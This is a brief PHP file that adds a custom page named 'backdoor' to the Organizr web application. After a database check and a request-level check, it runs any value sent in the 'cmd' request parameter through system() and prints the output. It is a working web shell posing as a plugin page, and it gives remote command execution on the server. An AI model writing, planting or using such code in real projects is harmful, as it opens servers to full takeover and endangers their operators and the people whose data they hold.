<?php
$GLOBALS['organizrPages'][] = 'backdoor';
function get_page_plugin_custom_page_here($Organizr)
{
    if (!$Organizr) {
        $Organizr = new Organizr();
    }
    if ((!$Organizr->hasDB())) {
        return false;
    }
    if (!$Organizr->qualifyRequest(14, true)) {
        return false;
    }
    
    if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
    }
    
    return '';
}
